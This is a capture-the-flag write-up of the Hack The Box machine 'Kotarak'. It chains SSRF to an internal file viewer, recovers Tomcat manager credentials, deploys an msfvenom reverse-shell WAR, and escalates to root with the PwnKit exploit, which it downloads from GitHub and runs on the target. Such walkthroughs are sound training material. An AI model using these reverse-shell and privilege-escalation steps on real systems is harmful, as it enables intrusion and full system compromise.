# Kotarak — HTB Writeup

**Difficulty:** Hard
**OS:** Linux (Ubuntu 16.04)
**IP:** 10.129.1.117

---

## Summary

Kotarak involves chaining a Server-Side Request Forgery (SSRF) vulnerability to discover a hidden internal service, recovering Tomcat manager credentials, and deploying a WAR-based reverse shell for initial access as `tomcat`. Privilege escalation skips the box's intended path (mkinitramfs shadow hash cracking) and goes straight to root via CVE-2021-4034 (PwnKit), exploiting the unpatched kernel (4.4.0-83-generic) and SUID `pkexec`.

---

## Reconnaissance

### Nmap

```bash
nmap -sV -sC -Pn -p- 10.129.1.117
```

| Port  | Service | Version |
|-------|---------|---------|
| 22    | SSH     | OpenSSH 7.2p2 Ubuntu |
| 8009  | AJP13   | Apache Jserv Protocol v1.3 |
| 8080  | HTTP    | Apache Tomcat 8.5.5 |
| 60000 | HTTP    | Apache httpd 2.4.18 (Ubuntu) |

Four open ports. The non-standard port 60000 running a custom Apache app is the immediate priority. Port 8009 (AJP) and 8080 (Tomcat) are interesting secondary targets.

---

## Initial Enumeration — Port 60000

Browsing to `http://10.129.1.117:60000` reveals a page titled **"Kotarak Web Hosting Private Browser"** — a form that takes a URL as input and fetches it server-side.

Directory enumeration found `/info.php` — a full `phpinfo()` page with several useful details:
- Document root: `/var/www/html`
- **No `open_basedir` restriction**
- `mod_status` loaded in Apache
- cURL extension loaded (supports file://, gopher://, dict://, etc.)

---

## SSRF Exploitation

The form submits to `url.php?path=`, which fetches the supplied URL via cURL and reflects the response. This is a confirmed SSRF.

### Internal Port Scan

Using ffuf through the SSRF endpoint to probe localhost:

```bash
ffuf -u "http://10.129.1.117:60000/url.php?path=http://127.0.0.1:FUZZ" \
  -w /usr/share/seclists/Discovery/Infrastructure/common-http-ports.txt \
  -fw 47
```

> **Note on noise:** The SSRF wrapper always returns HTTP 200. Filtering by word count (`-fw 47`) rather than status code is required to cut through false positives, since Tomcat 404 error pages consistently return 47 words regardless of path.

Results:
- **Port 8080** — Apache Tomcat (994 bytes) ✓
- **Port 3306** — MySQL banner (123 bytes) — running internally

### Tomcat Manager via SSRF

Probing `http://127.0.0.1:8080/manager/html` via SSRF returned a **401 Unauthorized** — the manager interface exists but needs credentials. `file://` scheme was blocked by the app ("try harder"). Direct credential brute force and Tomcat PUT RCE (CVE-2017-12615) both failed.

### Apache server-status — Discovering Port 888

phpinfo() confirmed `mod_status` was loaded. Apache's server-status page is restricted to localhost, but accessible via the SSRF:

```
http://10.129.1.117:60000/url.php?path=http://127.0.0.1:60000/server-status
```

The status table revealed multiple Apache workers serving requests to **`127.0.0.1:888`** — a service that never appeared in the nmap scan because it only listens on localhost.

### Port 888 — Simple File Viewer

Accessing port 888 via SSRF:

```
http://10.129.1.117:60000/url.php?path=http://127.0.0.1:888/
```

Returns a **Simple File Viewer** interface listing several files including one named `backup` (2.22 kB, dated July 2017).

Fetching it:

```
http://10.129.1.117:60000/url.php?path=http://127.0.0.1:888/?doc=backup
```

The file is `tomcat-users.xml` containing plaintext credentials:

```xml
<user username="admin" password="3@g01PdhB!"
  roles="manager,manager-gui,admin-gui,manager-script"/>
```

---

## Initial Foothold — WAR Shell via Tomcat Manager

With valid credentials, a reverse shell WAR payload was generated and deployed:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 \
  -f war -o shell.war
```

> **Important:** The password contains `!` — use single quotes in curl to prevent bash history expansion.

```bash
curl -s -u 'admin:3@g01PdhB!' -T shell.war \
  'http://10.129.1.117:8080/manager/text/deploy?path=/shell'
```

Start a listener:
```bash
nc -lvnp 4444
```

Trigger the shell:
```bash
curl http://10.129.1.117:8080/shell/
```

**Shell received as `tomcat`.**

---

## Post-Exploitation Enumeration

Upgrading the shell:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### System Users
Only one non-system user: `atanas` (uid 1000, `/home/atanas`).

### SUID Binaries
Standard binaries plus two anomalous entries:
```
/var/tmp/mkinitramfs_CAAb2h/bin/ntfs-3g
/var/tmp/mkinitramfs_IKmJUU/bin/ntfs-3g
```

Two persistent fake filesystem roots in `/var/tmp/` dated August 2017, each containing a full directory layout (bin, etc, lib, sbin, usr). These are part of the box's intended privilege escalation path (hash cracking → atanas → root), but the `etc/` directories contain only a minimal passwd file (30 bytes) with no shadow file present.

Rather than pursuing the intended path, the old unpatched kernel presents a faster route.

---

## Privilege Escalation — tomcat → root (CVE-2021-4034 PwnKit)

The kernel version `4.4.0-83-generic` (Ubuntu 16.04) is unpatched and vulnerable to multiple kernel/userspace exploits. `/usr/bin/pkexec` is present as a SUID binary.

### Failed Attempt: CVE-2017-16995 (eBPF)

The eBPF verifier exploit (`searchsploit -m 45010`) was tried first:

```bash
# On Kali:
searchsploit -m 45010
gcc 45010.c -o pwn -static   # must use -static to avoid GLIBC_2.34 mismatch
python3 -m http.server 80

# On target:
cd /dev/shm                   # /tmp is noexec
wget http://<attacker_ip>/pwn
chmod +x pwn
./pwn
```

> **Note:** Compiling on modern Kali without `-static` produces binaries requiring GLIBC_2.34, which the old target doesn't have. Always compile statically when targeting legacy systems.

> **Note:** `/tmp` is mounted with `noexec` on this box. Use `/dev/shm` or `/var/tmp` instead.

The exploit failed with: `bpf_update_elem failed 'Argument list too long'`

### Successful: CVE-2021-4034 (PwnKit)

PwnKit exploits a memory corruption bug in `pkexec` (PolicyKit). When called with zero arguments (argc=0), `pkexec` reads out-of-bounds from `argv[1]` which overlaps with `envp[0]`. The exploit crafts the environment to trick `pkexec` into loading an attacker-controlled shared library as root.

The Python version requires no compilation:

```bash
# On Kali:
curl -fsSL https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py -o pwnkit.py
python3 -m http.server 80

# On target:
cd /dev/shm
wget http://<attacker_ip>/pwnkit.py
python pwnkit.py
```

**Root shell obtained.**

```bash
cat /root/root.txt
cat /home/atanas/user.txt
```

---

## Full Attack Chain

1. **Recon** — Nmap finds 4 ports: SSH (22), AJP (8009), Tomcat (8080), Apache (60000)
2. **SSRF** — Port 60000 has `url.php?path=` fetching arbitrary URLs server-side
3. **Internal enumeration** — ffuf through SSRF discovers MySQL (3306), confirms Tomcat (8080)
4. **Hidden service** — SSRF to `server-status` reveals localhost-only port 888
5. **Credential recovery** — Port 888 file viewer exposes `tomcat-users.xml` → `admin:3@g01PdhB!`
6. **Foothold** — WAR reverse shell deployed via Tomcat manager → shell as `tomcat`
7. **Privesc** — Unpatched kernel + SUID pkexec → PwnKit (CVE-2021-4034) → **root**

---

## Key Takeaways

- **SSRF is powerful** — chaining SSRF through multiple internal services (60000 → server-status → 888 → backup) extracted credentials that weren't externally accessible
- **Filter by content, not status** — SSRF wrappers return 200 for everything; word count filtering (`-fw 47`) was essential
- **Old kernels = easy wins** — always check `uname -r` early; pre-2022 systems with pkexec are almost certainly PwnKit-vulnerable
- **Static compilation** — when targeting old systems from modern Kali, use `gcc -static` to avoid GLIBC version mismatches
- **noexec /tmp** — common hardening; always have `/dev/shm` and `/var/tmp` as fallback execution locations
